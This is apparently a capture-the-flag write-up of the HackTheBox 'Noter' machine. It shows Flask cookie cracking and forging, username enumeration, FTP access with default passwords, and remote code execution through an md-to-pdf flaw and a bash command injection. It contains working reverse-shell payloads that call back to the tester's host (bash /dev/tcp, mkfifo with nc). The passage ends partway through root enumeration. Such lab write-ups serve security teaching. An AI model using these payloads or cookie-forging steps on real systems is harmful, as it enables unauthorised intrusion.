---
title: HTB: Noter
url: https://0xdf.gitlab.io/2022/09/03/htb-noter.html
date: 2022-09-03T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, hackthebox, htb-noter, nmap, ftp, python, flask, flask-cookie, flask-unsign, feroxbuster, wfuzz, source-code, md-to-pdf, command-injection, mysql, raptor, shared-object
---

![Noter](https://0xdfimages.gitlab.io/img/noter-cover.png)

Noter starts by registering an account on the website and looking at the Flask cookie. It’s crackable, but I don’t have another user’s name or anything else to fake of value. I’ll show a couple different ways to find a username, by generating tons of valid cookies and testing them, and by using the login error messages to find a valid username. With access as a higher priv user on the website, I get creds to the FTP server, where I find the default password scheme, and use that to pivot to the FTP admin. As admin, I get the site source, and find a RCE, both the intended way exploiting a markdown to PDF JavaScript library, as well as an unintended command injection. To get root, I’ll find MySQL running as root and use the Raptor exploit to get command execution through MySQL.

## Box Info

| Name | [Noter](https://hackthebox.com/machines/noter)  [Noter](https://hackthebox.com/machines/noter) [Play on HackTheBox](https://hackthebox.com/machines/noter) |
| --- | --- |
| Release Date | [07 May 2022](https://twitter.com/hackthebox_eu/status/1522244803790086145) |
| Retire Date | 03 Sep 2022 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Noter |
| Radar Graph | Radar chart for Noter |
| First Blood User | 00:26:44[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 00:26:38[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [kavigihan kavigihan](https://app.hackthebox.com/users/389926) |

## Recon

### nmap

`nmap` finds three open TCP ports, FTP (21), SSH (22) and Python-hosted HTTP (5000):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.160
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-03 17:01 UTC
Nmap scan report for 10.10.11.160
Host is up (0.095s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 8.07 seconds
oxdf@hacky$ nmap -p 21,22,5000 -sCV 10.10.11.160
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-03 17:02 UTC
Nmap scan report for 10.10.11.160
Host is up (0.093s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Noter
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.13 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 focal.

### FTP - TCP 21

`nmap` is typically good at calling out if anonymous login is allowed, but I’ll give it a shot just in case:

```

oxdf@hacky$ ftp 10.10.11.160
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
Name (10.10.11.160:oxdf): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> 

```

I’ll have to check back when I get creds.

### Website - TCP 80

#### Site

The website is a note taking application:

![image-20220901144626269](https://0xdfimages.gitlab.io/img/image-20220901144626269.png)

The “Home” and “Notes” links just redirect to `/login`, which presents a form:

![image-20220329201716395](https://0xdfimages.gitlab.io/img/image-20220329201716395.png)

No matter what I put in, it returns “Invalid Credentials” over the form:

![image-20220329201802455](https://0xdfimages.gitlab.io/img/image-20220329201802455.png)

Basic SQL injections don’t show any promise.

I’ll register an account on the site at `/register`:

![image-20220329202220792](https://0xdfimages.gitlab.io/img/image-20220329202220792.png)

It redirects to `/login` with a banner:

![image-20220329202248355](https://0xdfimages.gitlab.io/img/image-20220329202248355.png)

Back at the login form, I can now test how the form handles invalid username vs invalid password. I know 0xdf is an account. I’ll first try an account that won’t exist by mashing some keys:

![image-20220330063505433](https://0xdfimages.gitlab.io/img/image-20220330063505433.png)

When I change that to 0xdf with the wrong password:

![image-20220330063613983](https://0xdfimages.gitlab.io/img/image-20220330063613983.png)

The different error message for invalid user as opposed to invalid password means I can validate user names via brute force if I want.

On logging in, it reidirects to `/dashboard`:

![image-20220901145032786](https://0xdfimages.gitlab.io/img/image-20220901145032786.png)

The “Add Note” button leads to `/add_note`, which has a form. Trying to submit less than 30 characters as the body complains, so I’ll add one that’s longer:

![image-20220329202458665](https://0xdfimages.gitlab.io/img/image-20220329202458665.png)

It shows up on my dashboard:

![image-20220329202519942](https://0xdfimages.gitlab.io/img/image-20220329202519942.png)

I’ll try various XSS payloads, but everything seems to render correctly escaped.

“Notes” (`/notes`) shows my note now:

![image-20220329202613763](https://0xdfimages.gitlab.io/img/image-20220329202613763.png)

Clicking on it leads to `/note/3` and shows the note:

![image-20220329202634899](https://0xdfimages.gitlab.io/img/image-20220329202634899.png)

I’ll try seeing if there’s an inseucre direct object reference (IDOR) vulnerability by checking other note ids like `/note/1`, but it just redirects back to the notes list for any id that isn’t something my user owns.

Clicking on the link to “Upgrade to VIP” shows that the option is currently not available:

![image-20220330091900394](https://0xdfimages.gitlab.io/img/image-20220330091900394.png)

#### Tech Stack

`nmap` reported “Werkzeug httpd 2.0.2 (Python 3.8.10)”, which shows this is a Python-based server. It could be Flask, Django, or maybe even FastAPI. None of these typically use file extensions in their paths, so nothing to check for there.

When I register and login, the response sets a cookie and redirects to the dashboard:

```

HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 226
Location: http://10.10.11.160:5000/dashboard
Vary: Cookie
Set-Cookie: session=.eJwlx0EKgCAQBdCrDH_torU3iZCQHC0wBUcpEO-e0OrxOnYfrZws0FsH1QmkHQeLQGHNjWxhSvmhmENgR1eCGUbh7z6ra2ms0IRLsjdDY3mdx_gAqEYfRw.YkOi3g.uAoRysM25q2FzuEUmYMaCRMQ4aA; HttpOnly; Path=/
Server: Werkzeug/2.0.2 Python/3.8.10
Date: Wed, 30 Mar 2022 00:22:54 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/dashboard">/dashboard</a>. If not click the link.

```

That cookie kind of looks like a JWT, but pasting it into JWT.io doesn’t look right:

![image-20220329212628103](https://0xdfimages.gitlab.io/img/image-20220329212628103.png)

Flask cookies look a lot like JWTs. I’ll try [flask-unsign](https://pypi.org/project/flask-unsign/), a tool for decoding, brute-forcing, and crafting Flask cookies, and it works:

```

oxdf@hacky$ flask-unsign --decode --cookie '.eJwlx0EKgCAQBdCrDH_torU3iZCQHC0wBUcpEO-e0OrxOnYfrZws0FsH1QmkHQeLQGHNjWxhSvmhmENgR1eCGUbh7z6ra2ms0IRLsjdDY3mdx_gAqEYfRw.YkOi3g.uAoRysM25q2FzuEUmYMaCRMQ4aA'
{'_flashes': [('success', 'You are now logged in')], 'logged_in': True, 'username': '0xdf'}

```

This is a good sign that the application is running Flask.

The cookie also seems to hold a “flash”, which is a message that Flask will display on the next loaded page, in this case using the `_flashes` part of the cookie.

After visiting something else that doesn’t cause a message, the cookie is reduced to:

```

oxdf@hacky$ flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiMHhkZiJ9.YkOi3w.izn9BJ3ifHAo0BAfnrWr3EW6Nuc'
{'logged_in': True, 'username': '0xdf'}

```

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.160:5000

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.160:5000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        4l       24w      218c http://10.10.11.160:5000/logout => http://10.10.11.160:5000/login
200      GET       95l      152w     2642c http://10.10.11.160:5000/register
200      GET       67l      106w     1963c http://10.10.11.160:5000/login
302      GET        4l       24w      218c http://10.10.11.160:5000/dashboard => http://10.10.11.160:5000/login
302      GET        4l       24w      218c http://10.10.11.160:5000/notes => http://10.10.11.160:5000/login
302      GET        4l       24w      218c http://10.10.11.160:5000/VIP => http://10.10.11.160:5000/login
[####################] - 4m     29999/29999   0s      found:6       errors:0      
[####################] - 4m     29999/29999   115/s   http://10.10.11.160:5000 

```

Everything except `/login` and `/register` returns a redirect to `/login`.

## Shell as svc

### Access to Site as Blue

#### Crack Flask Cookie Secret

Above I looked at the Flask cookie, decoding it with `flask-unsign`. Flask cookies are signed with a secret, so that they can’t be modified without knowing that secret. It is possible to do a brute force attack to test for a weak secret, and `flask-unsign` provides that capability using `--unsign` with `-w` giving a wordlist.

Running it with `rockyou.txt` returns an error:

```

oxdf@hacky$ flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiMHhkZiJ9.YkOi3w.izn9BJ3ifHAo0BAfnrWr3EW6Nuc' -w /usr/share/wordlists/rockyou.txt 
[*] Session decodes to: {'logged_in': True, 'username': '0xdf'}
[*] Starting brute-forcer with 8 threads..
[!] Unhandled exception in cracker thread. Please report this issue on the official bug tracker: "https://github.com/Paradoxis/Flask-Unsign/issues" and don't forget to include the following traceback:

## Stack Trace
FlaskUnsignException: Secret must be a string-type (bytes, str) and received 'int'. To fix this, either add quotes to the secret 123456 or use the --no-literal-eval argument.
  File "/usr/lib/python3.8/multiprocessing/pool.py", line 125, in worker
    result = (True, func(*args, **kwds))
  File "/home/oxdf/.local/lib/python3.8/site-packages/flask_unsign/cracker.py", line 69, in unsign
    if session.verify(self.session, secret, legacy=self.legacy, salt=self.salt):
  File "/home/oxdf/.local/lib/python3.8/site-packages/flask_unsign/session.py", line 29, in verify
    raise FlaskUnsignException(

[!] Failed to find secret key after 0 attempts.

```

It seems to be interpreting “123456” in the file as an int, which is odd. But then the exception message tells how to fix this, by adding `--no-lteral-eval`. I’ll add that, and it works, finding the secret very quickly:

```

oxdf@hacky$ flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiMHhkZiJ9.YkOi3w.izn9BJ3ifHAo0BAfnrWr3EW6Nuc' -w /usr/share/wordlists/rockyou.txt --no-literal-eval
[*] Session decodes to: {'logged_in': True, 'username': '0xdf'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 17024 attempts
b'secret123'

```

#### Failed Access as admin

With access to the secret, I can write whatever I want into the cookie, which means I can log in as any use. So far through the site, there’s been no indication of any other user name, which is a challenge. One reasonable way to go would to hope that there’s an admin account.

I’ll craft a cookie:

```

oxdf@hacky$ flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret123'
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.YkP2Cg.saisYxScWGL1RiUL7hoO25l60hg

```

In Firefox dev tools, in the Storage tab, I’ll replace my cookie with that one:

![image-20220330063228612](https://0xdfimages.gitlab.io/img/image-20220330063228612.png)

On refreshing, it redirects to `/login`. This could mean that I messed up the cookie somehow, but it could also mean this isn’t a valid username.

#### Brute Username with Cookie

I’m going to generate a huge list of cookies with possible usernames. I’ll start a loop to generate them:

```

oxdf@hacky$ time cat /usr/share/seclists/Usernames/Names/names.txt | \
> while read user; do \
>   (flask-unsign --sign --cookie "{'logged_in': True, 'username': '$user'}" --secret 'secret123' &); \
> done > names_cookies

real    8m10.417s
user    0m14.970s
sys     0m4.190s

```

This will take a list of names and generate all the cookies I need. This is actually pretty slow, taking over eight minutes minutes to run. That’s because for each work it’s having to start up, which includes importing all of Flask.

I can dig into the `flask-unsign` source a bit and trace what’s happening when I call it with `--sign`. It ends up [here](https://github.com/Paradoxis/Flask-Unsign/blob/e934573b2bcc3cfd58769e93e6761d0a9d3f21ab/flask_unsign/session.py#L121-L142):

```

@lru_cache()
def get_serializer(secret: str, legacy: bool, salt: str) -> URLSafeTimedSerializer:
    """
    Get a (cached) serializer instance
    :param secret: Secret key
    :param salt: Salt
    :param legacy: Should the legacy timestamp generator be used?
    :return: Flask session serializer
    """
    if legacy:
        signer = LegacyTimestampSigner
    else:
        signer = TimestampSigner

    return URLSafeTimedSerializer(
        secret_key=secret,
        salt=salt,
        serializer=TaggedJSONSerializer(),
        signer=signer,
        signer_kwargs={
            'key_derivation': 'hmac',
            'digest_method': hashlib.sha1})

```

Tracing backwards I can find the default salt is “cookie-session”. Other things I know or are just imported at the top of the file. I can use this to generate a script of my own:

```

#!/usr/bin/env python3

import hashlib
import sys
from flask.json.tag import TaggedJSONSerializer
from itsdangerous import TimestampSigner, URLSafeTimedSerializer

if len(sys.argv) < 2:
    print(f"{sys.argv[0]} [wordlist]")
    sys.exit()

with open(sys.argv[1], 'r') as f:
    names = f.readlines()

for name in names:
    cookie = URLSafeTimedSerializer(
            secret_key='secret123',
            salt='cookie-session',
            serializer=TaggedJSONSerializer(),
            signer=TimestampSigner,
            signer_kwargs={
                'key_derivation': 'hmac',
                'digest_method': hashlib.sha1
                }
            )
    print(cookie.dumps({"logged_in": True, "username": name.strip()}))

```

This does the entire list in less than a second:

```

oxdf@hacky$ time python3 generate_flask_cookies.py /usr/share/seclists/Usernames/Names/names.txt > names_cookies 

real    0m0.525s
user    0m0.514s
sys     0m0.010s

```

Either way, I’ll use `wfuzz` to check each cookie, hiding 302 responses (redirects back to `/login`):

```

oxdf@hacky$ wfuzz -u http://10.10.11.160:5000/dashboard -H "Cookie: session=FUZZ" -w names_cookies --hc 302
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.160:5000/dashboard
Total requests: 10177

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                           
===================================================================

000001208:   200        82 L     144 W    2444 Ch     "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YkQbNg.aeOcEqo5Lu6G3McCv1lriOegoOY"                                                             

Total time: 361.2894
Processed Requests: 10177
Filtered Requests: 10176
Requests/sec.: 28.16854

```

It finds one. That one decodes to:

```

oxdf@hacky$ flask-unsign --decode --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YkQbNg.aeOcEqo5Lu6G3McCv1lriOegoOY"
{'logged_in': True, 'username': 'blue'}

```

#### Brute Username Using Login Oracle

I noted during enumeration that the site returned slightly different messages for an invalid user and invalid credentials for a real user. I can use that to find a valid username to forge a cookie for.

I’ll use `wfuzz` to send login requests for all the users in the [SecLists](https://github.com/danielmiessler/SecLists) `names.txt`, and watch for any that don’t respond “Invalid credentials”. There’s one hit:

```

oxdf@hacky$ wfuzz -u http://10.10.11.160:5000/login -d "username=FUZZ&password=junkpassword" -w /usr/share/seclists/Usernames/Names/names.txt --hs "Invalid credentials"
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.160:5000/login
Total requests: 10177

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000001208:   200        68 L     110 W    2034 Ch     "blue"

Total time: 195.6524
Processed Requests: 10177
Filtered Requests: 10176
Requests/sec.: 52.01569

```

It returned one valid username, blue (just like I found by crafting cookies). I’ll use `flask-unsign` to make a cookie:

```

oxdf@hacky$ flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret secret123
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YkRUJg.-0B60ZY6aQyHOSoCxBnWGOx-Rbw

```

#### Site Access / Enumeration

Regardless of which way I got a cookie for blue, replacing the current cookie in Firefox dev tools and then reloading `/dashboard` shows I’m now logged in as blue:

![image-20220330124752022](https://0xdfimages.gitlab.io/img/image-20220330124752022.png)

There’s also “Import Notes” and “Export Notes” buttons. I’ll come back to these in a bit.

### FTP Access as blue

Logged in as blue, clicking to edit the only note on the dashboard shows a to do list:

![image-20220330124908270](https://0xdfimages.gitlab.io/img/image-20220330124908270.png)

It’s not clear what “password note” blue is talking about, or what password. Looking at the “Notes” link a the top, there are two notes:

![image-20220330124939388](https://0xdfimages.gitlab.io/img/image-20220330124939388.png)

I’ve already looked at “Before the weekend”. The other one is from the Noter team:

![image-20220330125011092](https://0xdfimages.gitlab.io/img/image-20220330125011092.png)

The note is from ftp\_admin, and it has creds for FTP, “blue@Noter!”.

The creds work connect to FTP:

```

oxdf@hacky$ ftp 10.10.11.160
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
Name (10.10.11.160:oxdf): blue
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```

### FTP Access as ftp\_admin

There’s a directory, `files` and a PDF. The directory is empty:

```

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Dec 24 21:10 files
-rw-r--r--    1 1002     1002        12569 Dec 24 20:59 policy.pdf
226 Directory send OK.

```

I’ll download the PDF:

```

ftp> get policy.pdf 
local: policy.pdf remote: policy.pdf
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for policy.pdf (12569 bytes).
226 Transfer complete.
12569 bytes received in 0.00 secs (16.1112 MB/s)

```

The PDF is all about password security:

[![image-20220330125333700](https://0xdfimages.gitlab.io/img/image-20220330125333700.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220330125333700.png)

The most important bit gives the default password formula:

> Default user-password generated by the application is in the format of “username@site\_name!” (This applies to all your applications)

Given the note from ftp\_admin, I’ll see if that user is using the default password, and “ftp\_admin@Noter!” works:

```

oxdf@hacky$ ftp 10.10.11.160
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
Name (10.10.11.160:oxdf): ftp_admin
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```

There are two Zip archives:

```

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1003     1003        25559 Dec 26 21:51 app_backup_1635803546.zip
-rw-r--r--    1 1003     1003        26298 Dec 26 21:49 app_backup_1638395546.zip
226 Directory send OK.

```

I’ll download both:

```

ftp> mget *
mget app_backup_1635803546.zip? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for app_backup_1635803546.zip (25559 bytes).
226 Transfer complete.
25559 bytes received in 0.09 secs (271.5046 kB/s)
mget app_backup_1638395546.zip? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for app_backup_1638395546.zip (26298 bytes).
226 Transfer complete.
26298 bytes received in 0.09 secs (271.4417 kB/s)

```

### RCE in md-to-pdf

#### Unpacking Source

The first archive looks like the source for the site:

```

oxdf@hacky$ unzip -l app_backup_1635803546.zip
Archive:  app_backup_1635803546.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     9178  2021-12-26 21:48   app.py              
        0  2021-12-26 21:45   misc/
        0  2021-12-26 16:10   misc/attachments/
    46832  2021-12-25 12:09   misc/package-lock.json 
        0  2021-12-25 12:09   misc/node_modules/ 
      169  2021-12-26 21:45   misc/md-to-pdf.js    
        0  2021-12-21 13:15   templates/
        0  2021-12-17 13:51   templates/includes/
      393  2021-12-15 21:07   templates/includes/_messages.html
     1229  2021-12-23 10:54   templates/includes/_navbar.html
      238  2021-12-15 21:07   templates/includes/_formhelpers.html
      503  2021-12-19 19:25   templates/import_note.html
      246  2021-12-18 15:44   templates/upgrade.html 
      816  2021-12-21 19:47   templates/export_note.html
      393  2021-12-21 13:15   templates/note.html
      537  2021-12-15 21:07   templates/about.html
      755  2021-12-15 21:07   templates/register.html
      943  2021-12-23 10:54   templates/dashboard.html
      242  2021-12-17 13:56   templates/notes.html
      525  2021-12-23 14:03   templates/home.html
      641  2021-12-23 13:57   templates/layout.html
      466  2021-12-16 18:29   templates/add_note.html
      467  2021-12-17 13:55   templates/edit_note.html
     1036  2021-12-21 15:16   templates/vip_dashboard.html
      521  2021-12-17 21:32   templates/login.html
---------                     -------
    66130                     25 files

```

I can use the `<()` bash syntax (runs command inside and results are handled as if they are in a file) to compare the contents of the two zips. They are almost identical, other than `app.py` changed in size between them:

```

oxdf@hacky$ diff <(unzip -l app_backup_1638395546.zip) <( unzip -l app_backup_1635803546.zip )
1c1
< Archive:  app_backup_1638395546.zip
---
> Archive:  app_backup_1635803546.zip
4c4
<     13507  2021-12-26 21:49   app.py
---
>      9178  2021-12-26 21:48   app.py
30c30
<     70459                     25 files
---
>     66130                     25 files

```

I’ll pull `app.py` from each, and rename them to `app-1.py` and`app-2.py`:

```

oxdf@hacky$ unzip app_backup_1635803546.zip app.py             
Archive:  app_backup_1635803546.zip
  inflating: app.py
oxdf@hacky$ mv app.py app-1.py
oxdf@hacky$ unzip app_backup_1638395546.zip app.py
Archive:  app_backup_1638395546.zip            
  inflating: app.py                     
oxdf@hacky$ mv app.py app-2.py

```

Running `diff app-1.py app-2.py` shows that the first one has different creds for the DB:

```

< app.config['MYSQL_USER'] = 'root'
< app.config['MYSQL_PASSWORD'] = 'Nildogg36'
---
> app.config['MYSQL_USER'] = 'DB_user'
> app.config['MYSQL_PASSWORD'] = 'DB_password'

```

There’s also a bunch of stuff added in `app-2.py`. I think I can note the creds, and safely work from `app-2.py` for now.

#### Source Analysis

The code is interesting, and largely fits with what I saw on the site. There’s an interesting thing that jumps out in the `export_note_local` and `export_node_remote` functions. Each gets a note, either reading it locally or from a given URL, and then uses `subprocess` to run a `node` JavaScript program against it. For example, from `export_node_local`:

```

rand_int = random.randint(1,10000)
command = f"node misc/md-to-pdf.js  $'{note['body']}' {rand_int}"
subprocess.run(command, shell=True, executable="/bin/bash")

return send_file(attachment_dir + str(rand_int) +'.pdf', as_attachment=True)

```

The author has attempted to make this call in a secure way, using `$'{}'` to make sure whatever is passed in is handled in single quotes and can’t append commands with `;` to get command injection. But there still is an unintended command injection here (I’ll look at it [below](#alternative-command-injection)).

#### CVE-2021-23639

The `package-lock.json` file will give the version of the required JavaScript packages. I’ll extract that from the archive and find it with `grep`:

```

oxdf@hacky$ unzip app_backup_1638395546.zip  misc/package-lock.json
Archive:  app_backup_1638395546.zip
  inflating: misc/package-lock.json  
oxdf@hacky$ grep -A 3 pdf misc/package-lock.json 
    "md-to-pdf": {
      "version": "4.1.0",
      "resolved": "https://registry.npmjs.org/md-to-pdf/-/md-to-pdf-4.1.0.tgz",
      "integrity": "sha512-5CJVxncc51zkNY3vsbW49aUyylqSzUBQkiCsB0+6FlzO/qqR4UHi/e7Mh8RPMzyqiQGDAeK267I3U5HMl0agRw==",
      "requires": {
        "arg": "5.0.0",

```

Googling for this package and exploit returns a page:

![image-20220330152743772](https://0xdfimages.gitlab.io/img/image-20220330152743772.png)

There’s a payload an attacker can put in the passed in markdown that will result in RCE.

The site itself actually displayed a payload that doesn’t quite work, but going into the GitHub repo for the project, there’s an [issue for the bug](https://github.com/simonhaenisch/md-to-pdf/issues/99), with a nice working POC:

```

const { mdToPdf } = require('md-to-pdf');

var payload = '---js\n((require("child_process")).execSync("id > /tmp/RCE.txt"))\n---RCE';

(async () => {
	await mdToPdf({ content: payload }, { dest: './output.pdf' });
})();

```

#### Shell

I’m concerned about putting my input into the DB and getting it back out again, so I’ll start with the remote export. The code looks like:

```

# Export remote
@app.route('/export_note_remote', methods=['POST'])
@is_logged_in
def export_note_remote():
    if check_VIP(session['username']):
        try:
            url = request.form['url']

            status, error = parse_url(url)

            if (status is True) and (error is None):
                try:
                    r = pyrequest.get(url,allow_redirects=True)
                    rand_int = random.randint(1,10000)
                    command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
                    subprocess.run(command, shell=True, executable="/bin/bash")

                    if os.path.isfile(attachment_dir + f'{str(rand_int)}.pdf'):

                        return send_file(attachment_dir + f'{str(rand_int)}.pdf', as_attachment=True)

                    else:
                        return render_template('export_note.html', error="Error occurred while exporting the !")

                except Exception as e:
                    return render_template('export_note.html', error="Error occurred!")

            else:
                return render_template('export_note.html', error=f"Error occurred while exporting ! ({error})")

        except Exception as e:
            return render_template('export_note.html', error=f"Error occurred while exporting ! ({e})")

    else:
        abort(403)

```

The client-side filtering wants the input file to be a markdown file, and this is markdown to pdf, so I’ll create a simple `payload.md`:

```
---js\n((require("child_process")).execSync("bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'"))\n---RCE

```

I’ll start a Python webserver and a `nc` listener, and submit `http://10.10.14.6/payload.md` to Noter. There’s a connection at the webserver and then a connect at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.160 60204
/bin/bash: 1"))\n---RCE: ambiguous redirect

```

It’s not liking a redirect, which is largely what this shell is based on (see my [detailed video](https://www.youtube.com/watch?v=OjkVep2EIlw) on it). I’ll switch to the `mkfifo` rev shell (detailed [video](https://www.youtube.com/watch?v=_q_ZCy-hEqg) on that one too) with a new payload:

```
---js\n((require("child_process")).execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 443 >/tmp/f"))\n---RCE

```

This time it works!

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.160 60316
/bin/sh: 0: can't access tty; job control turned off
$

```

I’ll do the [shell upgrade trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

$ script /dev/null -c bash
Script started, file is /dev/null
svc@noter:~$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
svc@noter:~$ 

```

And grab `user.txt`:

```

svc@noter:~$ cat user.txt
c83fff05************************

```

### Alternative Command Injection

#### Local POC

The string that gets passed to `subprocess` in the Python server is:

```

f"node misc/md-to-pdf.js  $'{note['body']}' {rand_int}"

```

The command itself doesn’t matter here, so let’s look at `echo $'stuff' 1234`, where I control stuff:

```

oxdf@hacky$ echo $'stuff' 123123
stuff 123123

```

If I try to inject with `;`, it doesn’t work because the single quotes take that as a string:

```

oxdf@hacky$ echo $';id' 123123
;id 123123

```

But I can add single quotes into the string I control like this:

```

oxdf@hacky$ echo $'';whoami; echo'' 123123

oxdf
123123

```

So that echo’s an empty string, runs `whoami`, and then prints the next string.

I could do the same with a subshell (`$()`):

```

oxdf@hacky$ echo $'$(whoami)' 123123
$(whoami) 123123
oxdf@hacky$ echo $''$(whoami)'' 123123
oxdf 123123

```

#### Exploit

I’ll make a markdown file with the exploit using the same shell as above:

```

oxdf@hacky$ cat cmdinj.md 
'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 443 >/tmp/f)'

```

I’ll host the file and give the URL to the site, and it returns a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.160 49996
/bin/sh: 0: can't access tty; job control turned off
$ 

```

## Shell as root

### Enumeration

#### Filesystem

There’s not much of interest in the user’s home dir. The web app seems to be running out of `app`, but I’ve already had access to that source code. The live source does show the new MySQL user:

```

# Config MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'DB_user'
app.config['MYSQL_PASSWORD'] = 'DB_password'
app.config['MYSQL_DB'] = 'app'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor' 

```

`/opt` has a single file, `backup.sh`:

```

svc@noter:/opt$ ls
backup.sh

```

This seems to be what created the backups I found over FTP, but it clearly isn’t running often.

The FTP roots are in `/srv/ftp`, but there’s nothing there I didn’t already have access to.

```

svc@noter:/srv/ftp$ ls
blue  ftp_admin

```

#### Processes

Running `ps auxww` doesn’t give any processes except those owned by svc:

```

svc@noter:/srv/ftp/ftp_admin$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
svc         1141  0.0  1.2 618460 51596 ?        Ssl  16:38   0:04 PM2 v5.2.0: God Daemon (/home/svc/.pm2)
svc         1170  0.2  1.1 485808 45816 ?        Ssl  16:38   0:25 python3 /home/svc/app/web/app.py
svc        12868  0.1  1.4 601756 58464 ?        Sl   19:40   0:00 node /home/svc/app/web/misc/md-to-pdf.js ---js ((require("child_process")).execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 443 >/tmp/f")) ---RCE 9439
svc        12875  0.0  0.0   2608   536 ?        S    19:40   0:00 /bin/sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 443 >/tmp/f
svc        12878  0.0  0.0   7372   516 ?        S    19:40   0:00 cat /tmp/f
svc        12879  0.0  0.0   2608   596 ?        S    19:40   0:00 /bin/sh -i
svc        12880  0.0  0.0   3332  1956 ?        R    19:40   0:00 nc 10.10.14.6 443
svc        12881  0.0  0.0   7356  2272 ?        S    19:42   0:00 script /dev/null -c bash
svc        12882  0.0  0.1  10060  5180 pts/0    Ss   19:42   0:00 bash
